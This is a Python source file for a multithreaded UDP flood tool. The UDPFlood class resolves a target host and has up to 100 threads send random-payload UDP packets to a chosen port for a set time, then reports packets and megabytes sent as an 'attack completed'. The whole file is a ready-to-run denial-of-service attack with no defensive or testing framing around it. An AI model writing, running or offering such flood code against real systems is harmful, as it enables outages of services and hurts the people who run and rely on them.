import socket
import time
import threading
import random

class UDPFlood:
    """
    UDP Flood - sends high volume UDP packets to target
    """
    def __init__(self, target, duration=30, threads=100, port=80, packet_size=1024, callback=None):
        self.target = target
        self.duration = duration
        self.threads = threads
        self.port = port
        self.packet_size = min(packet_size, 65507)  # Max UDP payload
        self.callback = callback
        self.stop_event = threading.Event()
        self.stats = {
            "packets_sent": 0,
            "bytes_sent": 0,
            "start_time": None,
            "end_time": None
        }
        self.lock = threading.Lock()
        
        # Remove protocol if present
        self.target = target.replace("http://", "").replace("https://", "").split("/")[0]
        
        # Resolve target IP
        try:
            self.target_ip = socket.gethostbyname(self.target)
        except:
            self.target_ip = self.target
    
    def log(self, message):
        if self.callback:
            self.callback(message)
        else:
            print(f"[UDP Flood] {message}")
    
    def send_packet(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)
            
            # Generate random payload
            payload = bytes(random.randint(0, 255) for _ in range(self.packet_size))
            
            sock.sendto(payload, (self.target_ip, self.port))
            
            with self.lock:
                self.stats["packets_sent"] += 1
                self.stats["bytes_sent"] += self.packet_size
            
            sock.close()
            return True
        except Exception as e:
            return False
    
    def worker(self):
        while not self.stop_event.is_set():
            self.send_packet()
            time.sleep(0.001)
    
    def run(self):
        self.stats["start_time"] = time.time()
        self.log(f"Starting UDP Flood on {self.target} ({self.target_ip}):{self.port}")
        self.log(f"Duration: {self.duration}s | Threads: {self.threads} | Packet Size: {self.packet_size}")
        
        thread_list = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        # Run for specified duration
        time.sleep(self.duration)
        self.stop()
        
        # Wait for threads to finish
        for t in thread_list:
            t.join(timeout=2)
        
        self.stats["end_time"] = time.time()
        mb_sent = self.stats["bytes_sent"] / (1024 * 1024)
        self.log(f"Attack completed. Packets: {self.stats['packets_sent']} | Data: {mb_sent:.2f} MB")
        return self.stats
    
    def stop(self):
        self.stop_event.set()
        self.log("Stop signal received")